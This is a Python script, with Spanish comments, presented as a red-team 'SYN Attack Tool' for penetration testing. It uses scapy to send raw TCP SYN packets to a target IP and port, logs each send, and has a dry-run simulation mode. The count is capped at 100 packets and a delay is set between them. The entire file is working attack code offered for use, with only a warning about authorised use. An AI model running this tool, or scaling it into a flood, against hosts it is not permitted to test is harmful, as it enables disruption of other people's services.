#!/usr/bin/env python3

from scapy.all import IP, TCP, send
import argparse
import time
import sys
from datetime import datetime


def validate_ip(ip):
    """Valida formato básico de dirección IP."""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False


def validate_port(port):
    """Valida que el puerto esté en rango válido."""
    return 1 <= port <= 65535


def log_attack(target_ip, target_port, packet_num, simulated=False):
    """Registra cada intento de ataque en archivo."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mode = "SIMULADO" if simulated else "ENVIADO"
    log_entry = f"[{timestamp}] {mode} - SYN #{packet_num} -> {target_ip}:{target_port}\n"
    
    with open("attack_log.txt", "a") as log:
        log.write(log_entry)


def syn_attack(target_ip, target_port, packet_count=3, simulate=False, delay=1):
    """
    Ejecuta ataque SYN controlado.
    
    Args:
        target_ip: IP objetivo
        target_port: Puerto objetivo
        packet_count: Número de paquetes a enviar
        simulate: Si es True, solo simula sin enviar paquetes
        delay: Pausa entre paquetes en segundos
    """
    print("=" * 60)
    print("Red Team - SYN Attack Tool")
    print("=" * 60)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Packets: {packet_count}")
    print(f"Mode: {'SIMULATION (dry-run)' if simulate else 'ATTACK'}")
    print(f"Delay: {delay}s")
    print("=" * 60)
    
    if not simulate:
        print("\n[ATTACK] Iniciando envío de paquetes SYN...")
        time.sleep(1)
    else:
        print("\n[SIMULATION] Modo de prueba activado. No se enviarán paquetes reales.")
    
    success_count = 0
    
    for i in range(packet_count):
        try:
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            
            if simulate:
                print(f"[DRY-RUN] Paquete #{i+1}/{packet_count} - SYN a {target_ip}:{target_port}")
                success_count += 1
            else:
                send(packet, verbose=1)
                print(f"[SENT] Paquete #{i+1}/{packet_count} - SYN enviado a {target_ip}:{target_port}")
                success_count += 1
            
            log_attack(target_ip, target_port, i+1, simulate)
            
            if i < packet_count - 1:
                time.sleep(delay)
                
        except PermissionError:
            print("\n[ERROR] Permisos insuficientes. Ejecutar con sudo.")
            sys.exit(1)
        except Exception as e:
            print(f"[ERROR] Paquete #{i+1} falló: {str(e)}")
    
    print("\n" + "=" * 60)
    print(f"Ataque completado: {success_count}/{packet_count} paquetes")
    print(f"Log guardado en: attack_log.txt")
    print("=" * 60)


def main():
    """Función principal con manejo de argumentos."""
    parser = argparse.ArgumentParser(
        description="Herramienta de ataque SYN controlado para pruebas de penetración",
        epilog="ADVERTENCIA: Solo usar en infraestructura autorizada. Uso no autorizado es ilegal."
    )
    
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="IP objetivo"
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        type=int,
        help="Puerto objetivo"
    )
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=3,
        help="Número de paquetes a enviar (default: 3)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=1.0,
        help="Pausa entre paquetes en segundos (default: 1.0)"
    )
    parser.add_argument(
        "--simulate",
        action="store_true",
        help="Modo de prueba (no envía paquetes reales)"
    )
    
    args = parser.parse_args()
    
    # Validación de entrada
    if not validate_ip(args.target):
        print(f"[ERROR] IP inválida: {args.target}")
        sys.exit(1)
    
    if not validate_port(args.port):
        print(f"[ERROR] Puerto inválido: {args.port} (rango: 1-65535)")
        sys.exit(1)
    
    if args.count < 1 or args.count > 100:
        print("[ERROR] Número de paquetes debe estar entre 1 y 100")
        sys.exit(1)
    
    # Ejecutar ataque
    try:
        syn_attack(
            target_ip=args.target,
            target_port=args.port,
            packet_count=args.count,
            simulate=args.simulate,
            delay=args.delay
        )
    except KeyboardInterrupt:
        print("\n\n[INFO] Ataque interrumpido por el usuario")
        sys.exit(0)


if __name__ == "__main__":
    main()